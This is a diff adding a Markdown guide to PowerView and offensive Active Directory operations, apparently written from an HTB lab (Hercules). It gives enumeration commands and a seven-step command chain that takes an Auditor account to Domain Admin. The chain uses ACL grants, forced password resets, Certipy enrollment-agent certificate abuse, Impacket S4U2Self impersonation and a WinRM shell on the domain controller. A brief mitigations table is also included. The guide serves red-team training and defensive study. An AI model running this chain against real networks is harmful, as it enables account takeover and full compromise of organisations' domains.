@@ -1,3 +1,233 @@
+
+
+# 🧠 PowerView & Active Directory Offensive Operations  
+### _A Practitioner’s Guide to Enumerating, Controlling, and Abusing AD Environments_
+
+---
+
+## 🔍 Introduction
+
+PowerView is a PowerShell‑based toolset created by **Will Schroeder (@harmj0y)** for advanced Active Directory reconnaissance and abuse.  
+It gives defenders visibility into how attackers move through AD networks — and gives red‑teamers the same view adversaries exploit.
+
+This guide combines background theory **and** practical demonstrations including the exact syntax used in a real HTB lab (Hercules).  
+It’s suitable for:
+
+- Red teams simulating AD compromise  
+- Blue teams researching lateral‑movement paths  
+- Students building offensive security labs  
+
+---
+
+## 📦 1. PowerView Jump‑Start
+
+Download the original module:
+
+```bash
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+```
+
+Launch within a PowerShell context (interactive host, WinRM, or reverse shell):
+
+```powershell
+. .\PowerView.ps1
+```
+
+Verify the module:
+
+```powershell
+Get-Command -Module PowerView | Select-Object Name
+```
+
+**Tip:** When operating without PowerShell (e.g. from Kali), similar functionality is available through [`powerview.py`](https://github.com/aniqfakhrul/powerview.py).
+
+---
+
+## 👓 2. Enumerating Active Directory
+
+### List domain computers
+
+```powershell
+Get-NetComputer -FullData
+```
+
+### Find live sessions and hunters
+
+```powershell
+Invoke-UserHunter
+```
+
+Use pipelines to filter specific systems:
+
+```powershell
+Invoke-UserHunter | ? {$_.ComputerName -eq "DC01"}
+```
+
+### Resolve group memberships
+
+```powershell
+Get-NetGroup
+Get-NetGroupMember -GroupName "Domain Admins"
+```
+
+### Inspect a specific user object
+
+```powershell
+Get-NetUser -Identity "j.doe"
+```
+
+Pipe results for focused attributes:
+
+```powershell
+Get-NetUser | ? {$_.Name -match "CEO"} | Select-Object name,mail,title,info
+```
+
+---
+
+## 🔱 3. Permission Discovery and Abuse
+
+PowerView exposes effective rights and allows ACL abuse directly:
+
+| Goal | Cmdlet |
+|------|--------|
+| Read object ACL | `Get-DomainObjectAcl` |
+| Add new ACE | `Add-DomainObjectAcl` |
+| Modify existing | `Set-DomainObject` |
+| Reset passwords | `Set-DomainUserPassword` |
+
+Example:
+
+```powershell
+Add-DomainObjectAcl -TargetSearchBase "OU=Finance,DC=corp,DC=local" `
+    -PrincipalIdentity "Auditor" -Rights FullControl -Verbose
+```
+
+---
+
+## ⚙️ 4. From Visibility to Control – Example AD Attack Chain  
+
+Below is the **exact chain** executed in the Hercules CTF to move from a limited Auditor account to full Domain Admin.
+
+### Step 1 · Auditor → OU Control
+```powershell
+Add-DomainObjectAcl -TargetSearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" `
+   -PrincipalIdentity "Auditor" -Rights FullControl -Verbose
+```
+
+### Step 2 · Enable & Reset a User
+```powershell
+Set-DomainObject -Identity "fernando.r" -Set @{useraccountcontrol=512}
+Set-DomainUserPassword -Identity "fernando.r" `
+   -AccountPassword (ConvertTo-SecureString 'Password678!' -AsPlainText -Force)
+```
+
+### Step 3 · Gain Certificate‑Based Access (Certipy Integration)
+
+```bash
+certipy-ad req -k -upn fernando.r@hercules.htb \
+  -dc-ip 10.129.242.196 -ca CA-HERCULES \
+  -template EnrollmentAgentOffline -application-policies 'Client Authentication' -dcom
+```
+
+_Then use that cert to request a user cert “on behalf of” another domain user._
+
+---
+
+### Step 4 · ashley.b: Group Control → Enable `iis_administrator`
+
+```powershell
+Enable-ADAccount -Identity "CN=iis_administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb"
+Set-ADAccountPassword -Identity "iis_administrator" `
+   -NewPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Reset
+```
+
+---
+
+### Step 5 · iis_administrator → iis_webserver$ (Computer Account)
+
+```powershell
+Set-DomainUserPassword -Identity 'iis_webserver$' -AccountPassword 'Password123!'
+```
+
+---
+
+### Step 6 · iis_webserver$: Hash Replacement & S4U2Self
+
+```bash
+describeTicket.py iis_webserver$.ccache | grep 'Ticket Session Key'
+# e.g. f524a1f7008d102af747299891d69946
+
+changepasswd.py -newhashes :f524a1f7008d102af747299891d69946 \
+  'hercules.htb'/'iis_webserver$':'Password123!'@'dc.hercules.htb' -k
+
+getST.py -u2u -impersonate Administrator \
+  -spn cifs/dc.hercules.htb -k -no-pass 'hercules.htb'/'iis_webserver$'
+```
+
+---
+
+### Step 7 · Full DC Access
+
+```bash
+export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
+```
+
+🟩 **Result:** Command prompt as `HERCULES\Administrator` on DC.
+
+---
+
+## 🧩 5. Combining PowerView with Other Tools
+
+- **Impacket** → TGT/ST requests, S4U chains, Kerberos manipulation  
+- **Certipy** → Certificate authentication and abuse of mis‑configured templates  
+- **pypykatz** → Quick NT‑hash extraction for password operations  
+- **evil‑winrmexec** → Interactive encrypted WinRM shell  
+
+These integrate seamlessly into a cohesive red‑team flow.
+
+---
+
+## 🛡️ 6. Defensive Insights
+
+If you’re a blue‑team reader:
+
+| Mitigation | Purpose |
+|-------------|----------|
+| Restrict certificate template enrollment | Prevent “on behalf of” abuse |
+| Audit ACL modifications | Identify unexpected `FullControl` inheritances |
+| Review computer account password resets | Detect machine compromise |
+| Disable legacy Pre‑Auth = disabled accounts | Stops easy AS‑REP roasting and S4U attacks |
+
+---
+
+## 🧭 7. Quick Reference (Cheat Sheet)
+
+| Action | PowerView cmdlet |
+|---------|------------------|
+| Enumerate domains | `Get-NetDomain` |
+| List domain controllers | `Get-NetDomainController` |
+| Find user sessions | `Invoke-UserHunter` |
+| Enumerate ACLs | `Get-DomainObjectAcl` |
+| Grant rights | `Add-DomainObjectAcl` |
+| Set attributes | `Set-DomainObject` |
+| Reset password | `Set-DomainUserPassword` |
+| Query SPNs | `Get-SPN` |
+| Find unconstrained delegation | `Get-NetComputer -Unconstrained` |
+
+---
+
+## 🧾 8. Acknowledgments  
+
+Thanks to:  
+- **Will Schroeder / @harmj0y** — PowerView creator  
+- **Oliver Lyak / @ly4k** — Certipy author  
+- **SecureAuth / Fortra team** — Impacket contributors  
+
+---
+
+
+
 ##
 ##
 ##  https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
